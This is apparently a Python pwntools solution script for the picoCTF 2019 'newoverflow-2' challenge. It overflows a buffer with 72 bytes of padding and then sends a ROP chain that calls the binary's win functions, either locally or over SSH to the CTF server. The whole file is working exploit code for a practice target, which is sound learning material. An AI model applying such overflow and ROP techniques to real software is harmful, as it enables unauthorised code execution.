from pwn import *

if args['REMOTE']:
    s = ssh(host='2019shell1.picoctf.com', user='jib1337', password='notmyrealpasswordlol')

elf = context.binary = ELF('vuln')

win_one = p64(elf.symbols.win_fn1)
win_two = p64(elf.symbols.win_fn2)
flipwin2 = 0x00000000004007b4

ropdata = ROP(elf)
ropdata.win_fn1(0xdeadbeef)
ropdata.raw(flipwin2)     
ropdata.raw(0xeeeeeeee)    
ropdata.win_fn()
info(ropdata.dump())
chain = ropdata.chain()

if args['REMOTE']:
    p = s.process('vuln', cwd='/problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7')
else:
    p = process(elf.path)

payload1 = b'A'*72 + p64(elf.symbols.main)
payload2 = b'A'*72 + chain

p.sendlineafter('\n', payload1)
p.sendlineafter('\n', payload1)
print(p.sendlineafter('\n', payload2))
print(p.recvline())
